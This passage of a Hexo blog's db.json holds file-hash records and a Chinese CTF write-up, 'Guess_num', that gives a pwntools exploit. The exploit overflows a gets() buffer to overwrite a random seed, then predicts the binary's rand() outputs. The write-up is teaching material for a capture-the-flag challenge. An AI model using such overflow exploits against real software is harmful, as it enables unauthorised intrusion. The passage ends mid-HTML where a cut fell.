ba0ea3008f09ecae8b46242ec6021","modified":1593767742338},{"_id":"themes/next/scripts/filters/comment/livere.js","hash":"d5fefc31fba4ab0188305b1af1feb61da49fdeb0","modified":1593767742338},{"_id":"themes/next/scripts/filters/comment/valine.js","hash":"6cbd85f9433c06bae22225ccf75ac55e04f2d106","modified":1593767742338},{"_id":"themes/next/source/css/_variables/Mist.styl","hash":"f70be8e229da7e1715c11dd0e975a2e71e453ac8","modified":1593767742346},{"_id":"themes/next/source/css/_variables/Gemini.styl","hash":"f4e694e5db81e57442c7e34505a416d818b3044a","modified":1593767742346},{"_id":"themes/next/source/css/_variables/Muse.styl","hash":"62df49459d552bbf73841753da8011a1f5e875c8","modified":1593767742346},{"_id":"themes/next/source/css/_variables/base.styl","hash":"818508748b7a62e02035e87fe58e75b603ed56dc","modified":1593767742346},{"_id":"themes/next/source/css/_variables/Pisces.styl","hash":"612ec843372dae709acb17112c1145a53450cc59","modified":1593767742346},{"_id":"themes/next/source/js/schemes/muse.js","hash":"1eb9b88103ddcf8827b1a7cbc56471a9c5592d53","modified":1593767742346},{"_id":"themes/next/source/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1593767742350},{"_id":"themes/next/source/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1593767742350},{"_id":"themes/next/source/js/schemes/pisces.js","hash":"0ac5ce155bc58c972fe21c4c447f85e6f8755c62","modified":1593767742346},{"_id":"themes/next/source/css/_common/components/back-to-top-sidebar.styl","hash":"ca5e70662dcfb261c25191cc5db5084dcf661c76","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/back-to-top.styl","hash":"a47725574e1bee3bc3b63b0ff2039cc982b17eff","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/components.styl","hash":"8e7b57a72e757cf95278239641726bb2d5b869d1","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/outline.styl","hash":"a1690e035b505d28bdef2b4424c13fc6312ab049","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/reading-progress.styl","hash":"2e3bf7baf383c9073ec5e67f157d3cb3823c0957","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/mobile.styl","hash":"681d33e3bc85bdca407d93b134c089264837378c","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/base.styl","hash":"0b2c4b78eead410020d7c4ded59c75592a648df8","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/buttons.styl","hash":"a2e9e00962e43e98ec2614d6d248ef1773bb9b78","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/comments.styl","hash":"b1f0fab7344a20ed6748b04065b141ad423cf4d9","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/normalize.styl","hash":"b56367ea676ea8e8783ea89cd4ab150c7da7a060","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/pagination.styl","hash":"8f58570a1bbc34c4989a47a1b7d42a8030f38b06","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/scaffolding.styl","hash":"523fb7b653b87ae37fc91fc8813e4ffad87b0d7e","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tables.styl","hash":"18ce72d90459c9aa66910ac64eae115f2dde3767","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/toggles.styl","hash":"179e33b8ac7f4d8a8e76736a7e4f965fe9ab8b42","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Mist/_header.styl","hash":"f6516d0f7d89dc7b6c6e143a5af54b926f585d82","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Mist/_layout.styl","hash":"faf96e2a269cc7f275ba9f431b27f889369f966a","modified":1593845911671},{"_id":"themes/next/source/css/_schemes/Mist/_menu.styl","hash":"7104b9cef90ca3b140d7a7afcf15540a250218fc","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Mist/_posts-expand.styl","hash":"6136da4bbb7e70cec99f5c7ae8c7e74f5e7c261a","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Mist/index.styl","hash":"a717969829fa6ef88225095737df3f8ee86c286b","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Gemini/index.styl","hash":"7785bd756e0c4acede3a47fec1ed7b55988385a5","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Muse/_header.styl","hash":"f0131db6275ceaecae7e1a6a3798b8f89f6c850d","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Muse/_layout.styl","hash":"4d1c17345d2d39ef7698f7acf82dfc0f59308c34","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Muse/_menu.styl","hash":"93db5dafe9294542a6b5f647643cb9deaced8e06","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Muse/_sidebar.styl","hash":"2b2e7b5cea7783c9c8bb92655e26a67c266886f0","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Muse/_sub-menu.styl","hash":"c48ccd8d6651fe1a01faff8f01179456d39ba9b1","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Muse/index.styl","hash":"6ad168288b213cec357e9b5a97674ff2ef3a910c","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Pisces/_header.styl","hash":"e282df938bd029f391c466168d0e68389978f120","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Pisces/_layout.styl","hash":"70a4324b70501132855b5e59029acfc5d3da1ebd","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Pisces/_menu.styl","hash":"85da2f3006f4bef9a2199416ecfab4d288f848c4","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Pisces/_sidebar.styl","hash":"44f47c88c06d89d06f220f102649057118715828","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Pisces/_sub-menu.styl","hash":"e740deadcfc4f29c5cb01e40f9df6277262ba4e3","modified":1593767742346},{"_id":"themes/next/source/css/_schemes/Pisces/index.styl","hash":"6ad168288b213cec357e9b5a97674ff2ef3a910c","modified":1593767742346},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1593767742346},{"_id":"themes/next/source/lib/font-awesome/css/all.min.css","hash":"0038dc97c79451578b7bd48af60ba62282b4082b","modified":1593767742346},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1593767742350},{"_id":"themes/next/source/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1593767742346},{"_id":"themes/next/source/css/_common/components/pages/breadcrumb.styl","hash":"fafc96c86926b22afba8bb9418c05e6afbc05a57","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/pages/categories.styl","hash":"2bd0eb1512415325653b26d62a4463e6de83c5ac","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/pages/pages.styl","hash":"7504dbc5c70262b048143b2c37d2b5aa2809afa2","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/pages/schedule.styl","hash":"e771dcb0b4673e063c0f3e2d73e7336ac05bcd57","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/pages/tag-cloud.styl","hash":"d21d4ac1982c13d02f125a67c065412085a92ff2","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-collapse.styl","hash":"e75693f33dbc92afc55489438267869ae2f3db54","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-eof.styl","hash":"902569a9dea90548bec21a823dd3efd94ff7c133","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-expand.styl","hash":"ded41fd9d20a5e8db66aaff7cc50f105f5ef2952","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-copyright.styl","hash":"f49ca072b5a800f735e8f01fc3518f885951dd8e","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-followme.styl","hash":"1e4190c10c9e0c9ce92653b0dbcec21754b0b69d","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-gallery.styl","hash":"72d495a88f7d6515af425c12cbc67308a57d88ea","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-header.styl","hash":"65cb6edb69e94e70e3291e9132408361148d41d5","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-nav.styl","hash":"6a97bcfa635d637dc59005be3b931109e0d1ead5","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-reward.styl","hash":"d114b2a531129e739a27ba6271cfe6857aa9a865","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-rtl.styl","hash":"f5c2788a78790aca1a2f37f7149d6058afb539e0","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-tags.styl","hash":"99e12c9ce3d14d4837e3d3f12fc867ba9c565317","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post-widgets.styl","hash":"5b5649b9749e3fd8b63aef22ceeece0a6e1df605","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/post/post.styl","hash":"a760ee83ba6216871a9f14c5e56dc9bd0d9e2103","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/third-party/gitalk.styl","hash":"8a7fc03a568b95be8d3337195e38bc7ec5ba2b23","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/third-party/math.styl","hash":"b49e9fbd3c182b8fc066b8c2caf248e3eb748619","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/third-party/third-party.styl","hash":"9a878d0119785a2316f42aebcceaa05a120b9a7a","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/footer/footer.styl","hash":"454a4aebfabb4469b92a8cbb49f46c49ac9bf165","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/third-party/search.styl","hash":"9f0b93d109c9aec79450c8a0cf4a4eab717d674d","modified":1593767742342},{"_id":"themes/next/source/css/_common/components/third-party/related-posts.styl","hash":"e2992846b39bf3857b5104675af02ba73e72eed5","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/header.styl","hash":"a793cfff86ad4af818faef04c18013077873f8f0","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/github-banner.styl","hash":"e7a9fdb6478b8674b1cdf94de4f8052843fb71d9","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/headerband.styl","hash":"0caf32492692ba8e854da43697a2ec8a41612194","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/menu.styl","hash":"5f432a6ed9ca80a413c68b00e93d4a411abf280a","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/bookmark.styl","hash":"e2d606f1ac343e9be4f15dbbaf3464bc4df8bf81","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/site-meta.styl","hash":"45a239edca44acecf971d99b04f30a1aafbf6906","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/header/site-nav.styl","hash":"b2fc519828fe89a1f8f03ff7b809ad68cd46f3d7","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-author-links.styl","hash":"2cb1876e9e0c9ac32160888af27b1178dbcb0616","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-author.styl","hash":"fa0222197b5eee47e18ac864cdc6eac75678b8fe","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-blogroll.styl","hash":"44487d9ab290dc97871fa8dd4487016deb56e123","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-button.styl","hash":"1f0e7fbe80956f47087c2458ea880acf7a83078b","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-dimmer.styl","hash":"9b479c2f9a9bfed77885e5093b8245cc5d768ec7","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-nav.styl","hash":"a960a2dd587b15d3b3fe1b59525d6fa971c6a6ec","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-toc.styl","hash":"a05a4031e799bc864a4536f9ef61fe643cd421af","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar-toggle.styl","hash":"b3220db827e1adbca7880c2bb23e78fa7cbe95cb","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/sidebar.styl","hash":"a9cd93c36bae5af9223e7804963096274e8a4f03","modified":1593767742342},{"_id":"themes/next/source/css/_common/outline/sidebar/site-state.styl","hash":"2a47f8a6bb589c2fb635e6c1e4a2563c7f63c407","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/highlight/copy-code.styl","hash":"f71a3e86c05ea668b008cf05a81f67d92b6d65e4","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/highlight/diff.styl","hash":"d3f73688bb7423e3ab0de1efdf6db46db5e34f80","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/highlight/highlight.styl","hash":"35c871a809afa8306c8cde13651010e282548bc6","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/highlight/theme.styl","hash":"3b3acc5caa0b95a2598bef4eeacb21bab21bea56","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/blockquote-center.styl","hash":"1d2778ca5aeeeafaa690dc2766b01b352ab76a02","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/group-pictures.styl","hash":"709d10f763e357e1472d6471f8be384ec9e2d983","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/note.styl","hash":"e4d9a77ffe98e851c1202676940097ba28253313","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/tabs.styl","hash":"f23670f1d8e749f3e83766d446790d8fd9620278","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/tags.styl","hash":"9e4c0653cfd3cc6908fa0d97581bcf80861fb1e7","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/pdf.styl","hash":"b49c64f8e9a6ca1c45c0ba98febf1974fdd03616","modified":1593767742342},{"_id":"themes/next/source/css/_common/scaffolding/tags/label.styl","hash":"d7fce4b51b5f4b7c31d93a9edb6c6ce740aa0d6b","modified":1593767742342},{"_id":"source/assets/images/2019-09-07-中国移动维权之路/Screenshot2.jpg","hash":"4cf0648cb860413a11f7b5e148728ec7e7558a29","modified":1581061997189},{"_id":"source/assets/images/2019-09-07-中国移动维权之路/Screenshot1.jpg","hash":"3e9b94af13ce70183f54a45975d606bd795b3545","modified":1581061997185},{"_id":"public/categories/index.html","hash":"47ed0fbe4cca918034c52ebc26d5d081f02a0c65","modified":1593844825666},{"_id":"public/tags/index.html","hash":"2274b8bf2eb571d966633106e113700318e95bdf","modified":1593844825666},{"_id":"public/2019/09/07/2019-09-07-对线中国移动/index.html","hash":"ae8b2a0549331e99b6884e3bc5ca13c24a497d5f","modified":1593844825666},{"_id":"public/2019/07/02/2019-07-02-Guess_num/index.html","hash":"e66501c2acffbbfc8aacc7f0e47026c7380e4b10","modified":1593844825666},{"_id":"public/tags/pwn/index.html","hash":"ed2eb1cd57ae9420a5ce838d24302ef39f045277","modified":1593844825666},{"_id":"public/tags/life/index.html","hash":"e5399772ddfc366995f8261ddde202a4c78bf2f0","modified":1593844825666},{"_id":"public/categories/pwn/index.html","hash":"b84b5fcf8ba32303f2de093256d18207b3a38227","modified":1593844825666},{"_id":"public/categories/life/index.html","hash":"80a24d782bbad4ac29d8021488639ca6a2cc8e94","modified":1593844825666},{"_id":"public/archives/index.html","hash":"b94ceaa9173365544c9615dc8a31f1d80bd1f90f","modified":1593844825666},{"_id":"public/archives/2019/index.html","hash":"404eb415a425cb1233aaf0dc4fb0cf1feb25e7c4","modified":1593844825666},{"_id":"public/archives/2019/07/index.html","hash":"88dbcc36294f10dc52e3285e2a01274a8c053e5e","modified":1593844825666},{"_id":"public/archives/2019/08/index.html","hash":"96e551d5be605e0d09e41cd2376a23d0b3fa9b6b","modified":1593844825666},{"_id":"public/archives/2019/09/index.html","hash":"64f0d8255bef586f939f437e5881b32fa150d630","modified":1593844825666},{"_id":"public/archives/2020/index.html","hash":"f2229bc9c62e995c21e42309e2bfb0c44b174cf4","modified":1593844825666},{"_id":"public/archives/2020/02/index.html","hash":"69ea563d50ccab2c353ba8fb1cb69745e25b31ab","modified":1593844825666},{"_id":"public/archives/2020/05/index.html","hash":"cb92da5ade7ca5177328a53a47f5667fd0edfe63","modified":1593844825666},{"_id":"public/2020/05/24/2020-05-24-DAS&BJDCTF Writeup/index.html","hash":"5f9167cfcf46c0288d23420add74f7f0e9db50ac","modified":1593844825666},{"_id":"public/2020/02/25/2020-02-05-prctl&pwnable_orw/index.html","hash":"cdde0e79f9bde242c9cb9b04e5d774131adf548b","modified":1593844825666},{"_id":"public/2019/08/05/2019-08-05-安恒杯栈迁移/index.html","hash":"ca772f2011dace13c74d1dac400ea6343b008e7e","modified":1593844825666},{"_id":"public/index.html","hash":"69d82c97c3838ede90ba94493135953886cc6f06","modified":1593844825666},{"_id":"public/CNAME","hash":"0bc36c33f7e25341e491f60aca3b515d54008c6d","modified":1593837027578},{"_id":"public/images/algolia_logo.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1593837027578},{"_id":"public/images/apple-touch-icon-next.png","hash":"0bed710556355068b081985ce5cf1684535d512e","modified":1593840513146},{"_id":"public/images/avatar.gif","hash":"18c53e15eb0c84b139995f9334ed8522b40aeaf6","modified":1593837027578},{"_id":"public/images/favicon-32x32-next.png","hash":"58f096e9b3f59f2d543d328442cbcf48dac3d78a","modified":1593840513146},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1593837027578},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1593837027578},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1593837027578},{"_id":"public/images/favicon-16x16-next.png","hash":"397596d65c0eb88b8091c56ae722728c67a1e2b3","modified":1593840513146},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1593837027578},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1593837027578},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1593837027578},{"_id":"public/assets/images/2019-08-05-unexploit/unexploit1.png","hash":"590e73a5fdd8db13c36edbaedf6b609154f1d8e4","modified":1593837027578},{"_id":"public/assets/images/2019-08-05-unexploit/unexploit2.png","hash":"e13a6ab032e1dfe3af69cf6fb6a352a407d70d97","modified":1593837027578},{"_id":"public/images/logo.svg","hash":"02f4dbca0a22cef9d8afa19ef6433040285b88c5","modified":1593840513146},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1593837027578},{"_id":"public/assets/images/2020-02-07-prctl&pwnable_orw/struct2.png","hash":"f251d764ccf81ba035ced2df62b8eafcaf3d8002","modified":1593837027578},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"260bb01acd44d88dcb7f501a238ab968f86bef9e","modified":1593837027578},{"_id":"public/assets/images/2020-02-07-prctl&pwnable_orw/struct1.png","hash":"e4ad15ee0ece49126ce28e855bd033699d8caac4","modified":1593837027578},{"_id":"public/assets/images/2019-7-2-Guess_num/guess_num_1.png","hash":"20044604c06a11a2e0c31e632d9ced9224c1c44e","modified":1593837027578},{"_id":"public/assets/images/2020-02-07-prctl&pwnable_orw/struct3.png","hash":"7628d9565b0cc6a5642e30b7dbcdeb3ab808c12a","modified":1593837027578},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"75a88815c47a249eadb5f0edc1675957f860cca7","modified":1593837027578},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"509988477da79c146cb93fb728405f18e923c2de","modified":1593837027578},{"_id":"public/js/motion.js","hash":"72df86f6dfa29cce22abeff9d814c9dddfcf13a9","modified":1593837027578},{"_id":"public/js/bookmark.js","hash":"9734ebcb9b83489686f5c2da67dc9e6157e988ad","modified":1593837027578},{"_id":"public/js/next-boot.js","hash":"a1b0636423009d4a4e4cea97bcbf1842bfab582c","modified":1593837027578},{"_id":"public/js/algolia-search.js","hash":"498d233eb5c7af6940baf94c1a1c36fdf1dd2636","modified":1593837027578},{"_id":"public/js/schemes/muse.js","hash":"1eb9b88103ddcf8827b1a7cbc56471a9c5592d53","modified":1593837027578},{"_id":"public/js/schemes/pisces.js","hash":"0ac5ce155bc58c972fe21c4c447f85e6f8755c62","modified":1593837027578},{"_id":"public/css/main.css","hash":"a22ce15d1f17c8855ce5a3e98941ee379d57c3b3","modified":1593837027578},{"_id":"public/js/utils.js","hash":"2c6e6b4d9a592fbb4bf04689524db2cdfcd94ca7","modified":1593837027578},{"_id":"public/js/local-search.js","hash":"35ccf100d8f9c0fd6bfbb7fa88c2a76c42a69110","modified":1593837027578},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1593837027578},{"_id":"public/lib/anime.min.js","hash":"47cb482a8a488620a793d50ba8f6752324b46af3","modified":1593837027578},{"_id":"public/assets/images/2019-09-07-中国移动维权之路/Screenshot2.jpg","hash":"4cf0648cb860413a11f7b5e148728ec7e7558a29","modified":1593837027578},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1593837027578},{"_id":"public/assets/images/2019-09-07-中国移动维权之路/Screenshot1.jpg","hash":"3e9b94af13ce70183f54a45975d606bd795b3545","modified":1593837027578},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"0038dc97c79451578b7bd48af60ba62282b4082b","modified":1593837027578},{"_id":"themes/next/source/images/1.png","hash":"397596d65c0eb88b8091c56ae722728c67a1e2b3","modified":1593839592327},{"_id":"themes/next/source/images/2.png","hash":"58f096e9b3f59f2d543d328442cbcf48dac3d78a","modified":1593839595467}],"Category":[{"name":"pwn","_id":"ckc74vbkv00044djxbiyi9dt2"},{"name":"life","_id":"ckc74vblh000e4djx6uil5yy2"}],"Data":[],"Page":[{"title":"categories","date":"2020-07-03T11:04:58.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2020-07-03 19:04:58\ntype: \"categories\" \ncomments: false\n---\n","updated":"2020-07-03T16:17:37.968Z","path":"categories/index.html","layout":"page","_id":"ckc74vbkj00014djxgaytfvsc","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2020-07-03T11:11:14.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2020-07-03 19:11:14\ntype: \"tags\"\ncomments: false\n---\n","updated":"2020-07-03T11:11:46.420Z","path":"tags/index.html","layout":"page","_id":"ckc74vbkp00034djx04l69383","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"layout":"post","title":"Guess_num","description":11,"date":"2019-07-01T16:00:00.000Z","_content":"## Guess_num\n\n题目不难，但是学到了个新姿势 **cdll.LoadLibrar** ，可以用它来加载dll或者libc。\n\n### ida分析\n\n![img](/assets/images/2019-7-2-Guess_num/guess_num_1.png)\n\n名字v11和seed相差32(0x30-0x10)，而gets又没有限制，故可以将seed覆盖。\n\n### Exp\n```python\nfrom pwn import *\nfrom ctypes import *  \n \n#p = remote('','')\np = process('./guess_num') \nelf = ELF('./guess_num')\n \nlibc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')\n \npayload = 'A'*32  \npayload += p64(1)   #覆盖种子为1\np.recvuntil('name:')\np.sendline(payload)  \n \nlibc.srand(1)  #本地设置种子为一\n\nfor i in range(10):\n        num = str(libc.rand()%6+1)\n        p.recvuntil('number:')\n        p.sendline(num)\n \np.interactive()\n\n```\n","source":"_posts/2019-07-02-Guess_num.md","raw":"---\nlayout: post\ntitle: Guess_num\ncategories: pwn\ntags: [pwn]\ndescription: 11\ndate: 2019-07-02\n---\n## Guess_num\n\n题目不难，但是学到了个新姿势 **cdll.LoadLibrar** ，可以用它来加载dll或者libc。\n\n### ida分析\n\n![img](/assets/images/2019-7-2-Guess_num/guess_num_1.png)\n\n名字v11和seed相差32(0x30-0x10)，而gets又没有限制，故可以将seed覆盖。\n\n### Exp\n```python\nfrom pwn import *\nfrom ctypes import *  \n \n#p = remote('','')\np = process('./guess_num') \nelf = ELF('./guess_num')\n \nlibc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')\n \npayload = 'A'*32  \npayload += p64(1)   #覆盖种子为1\np.recvuntil('name:')\np.sendline(payload)  \n \nlibc.srand(1)  #本地设置种子为一\n\nfor i in range(10):\n        num = str(libc.rand()%6+1)\n        p.recvuntil('number:')\n        p.sendline(num)\n \np.interactive()\n\n```\n","slug":"2019-07-02-Guess_num","published":1,"updated":"2020-07-03T16:18:00.528Z","comments":1,"photos":[],"link":"","_id":"ckc74vbk000004djx5j2p3jc6","content":"<h2 id=\"Guess-num\"><a href=\"#Guess-num\" class=\"headerlink\" title=\"Guess_num\"></a>Guess_num</h2><p>题目不难，但是学到了个新姿势 <strong>cdll.LoadLibrar</strong> ，可以用它来加载dll或者libc。</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"/assets/images/2019-7-2-Guess_num/guess_num_1.png\" alt=\"img\"></p>\n<p>名字v11和seed相差32(0x30-0x10)，而gets又没有限制，故可以将seed覆盖。</p>\n<h3 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *  </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#p = remote('','')</span></span><br><span class=\"line\">p = process(<span class=\"string\">'./guess_num'</span>) </span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./guess_num'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc = cdll.LoadLibrary(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*<span class=\"number\">32</span>  </span><br><span class=\"line\">payload += p64(<span class=\"number\">1</span>)   <span class=\"comment\">#覆盖种子为1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'name:'</span>)</span><br><span class=\"line\">p.sendline(payload)  </span><br><span class=\"line\"> </span><br><span class=\"line\">libc.srand(<span class=\"number\">1</span>)  <span class=\"comment\">#本地设置种子为一</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">        num = str(libc.rand()%<span class=\"number\">6</span>+<span class=\"number\">1</span>)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">'number:'</span>)</span><br><span class=\"line\">        p.sendline(num)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Guess-num\"><a href=\"#Guess-num\" class=\"headerlink\" title=\"Guess_num\"></a>Guess_num</h2><p>题目不难，但是学到了个新姿势 <strong>cdll.LoadLibrar</strong> ，可以用它来加载dll或者libc。</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"/assets/images/2019-7-2-Guess_num/guess_num_1.png\" alt=\"img\"></p>\n<p>名字v11和seed相差32(0x30-0x10)，而gets又没有限制，故可以将seed覆盖。</p>\n<h3 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *  </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#p = remote('','')</span></span><br><span class=\"line\">p = process(<span class=\"string\">'./guess_num'</span>) </span><br><span 